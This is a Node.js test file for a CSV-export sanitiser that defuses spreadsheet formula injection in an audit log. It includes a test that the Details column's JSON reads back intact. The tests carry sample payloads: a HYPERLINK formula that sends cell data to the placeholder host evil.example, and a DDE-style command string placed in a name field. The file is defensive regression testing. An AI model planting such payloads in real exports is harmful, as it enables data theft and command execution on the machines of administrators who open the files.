// Spreadsheet formula injection in exports. REGRESSION (2026-10 audit): the audit-log CSV quoted its values but never neutralised a leading = + - @, and its Device
// column is the browser's User-Agent header, so a crafted header became a live formula when an admin opened the export in Excel. The same CSV also doubled the quotes
// of its Details column twice, so the JSON inside it could not be read back.
const test = require("node:test");
const assert = require("node:assert/strict");
const { safeCell, safeRow } = require("../src/utils/spreadsheetSafe");
const { auditCsv } = require("../src/modules/users/users.domain");

// Minimal RFC 4180 reader (quoted fields, doubled quotes, newlines inside quotes), enough to read auditCsv back.
function parseCsv(text) {
  const rows = []; let row = [], field = "", quoted = false;
  for (let i = 0; i < text.length; i++) {
    const c = text[i];
    if (quoted) {
      if (c === '"' && text[i + 1] === '"') { field += '"'; i++; } else if (c === '"') quoted = false; else field += c;
    } else if (c === '"') quoted = true;
    else if (c === ",") { row.push(field); field = ""; } else if (c === "\n") { row.push(field); rows.push(row); row = []; field = ""; } else field += c;
  }
  row.push(field); rows.push(row);
  return rows;
}
const log = (over = {}) => ({ createdAt: new Date("2026-10-19T10:00:00Z"), action: "LOGIN", adminName: "Asha", adminRole: "STAFF", ipAddress: "10.0.0.1", deviceInfo: "Chrome on Windows", studentId: null, instituteId: null, details: { title: "x" }, ...over });

test("safeCell prefixes text that a spreadsheet would run as a formula and leaves everything else alone", () => {
  for (const bad of ["=1+1", "+SUM(A1)", "-2+3", "@SUM(A1)", "\tcmd", "\rcmd", '=HYPERLINK("http://evil.example","x")']) assert.equal(safeCell(bad), `'${bad}`, JSON.stringify(bad));
  for (const ok of ["Asha", "Chrome on Windows", "2026-10-19T10:00:00.000Z", "a=b", "x-y", "", "10.0.0.1"]) assert.equal(safeCell(ok), ok);
  assert.equal(safeCell(42), 42); assert.equal(safeCell(null), null); assert.equal(safeCell(true), true);
  assert.deepEqual(safeRow({ a: "=1", b: 2, c: "ok" }), { a: "'=1", b: 2, c: "ok" });
});

test("the audit CSV neutralises a hostile User-Agent and a hostile actor name", () => {
  const csv = auditCsv([log({ deviceInfo: '=HYPERLINK("http://evil.example/?"&A1,"click")', adminName: "+cmd|' /C calc'!A0" })]);
  const [header, data] = parseCsv(csv);
  assert.equal(header.length, 9);
  assert.equal(data[5], `'=HYPERLINK("http://evil.example/?"&A1,"click")`, "Device");
  assert.equal(data[2], `'+cmd|' /C calc'!A0`, "Actor");
  for (const cell of data) assert.doesNotMatch(cell, /^[=+\-@\t\r]/, `no cell may start with a formula character: ${cell}`);
});

test("the audit CSV Details column reads back as the JSON that was stored", () => {
  const details = { title: 'He said "hi"', n: 3, nested: { ok: true } };
  const [, data] = parseCsv(auditCsv([log({ details })]));
  assert.deepEqual(JSON.parse(data[8]), details);
});

test("the audit CSV keeps ordinary rows unchanged and survives commas, quotes and newlines", () => {
  const csv = auditCsv([log(), log({ adminName: 'Rao, "K"\nSecond line', details: {} })]);
  const rows = parseCsv(csv);
  assert.equal(rows.length, 3);
  assert.deepEqual(rows[1].slice(0, 6), ["2026-10-19T10:00:00.000Z", "LOGIN", "Asha", "STAFF", "10.0.0.1", "Chrome on Windows"]);
  assert.equal(rows[2][2], 'Rao, "K"\nSecond line');
  assert.equal(JSON.parse(rows[2][8]) && Object.keys(JSON.parse(rows[2][8])).length, 0);
});
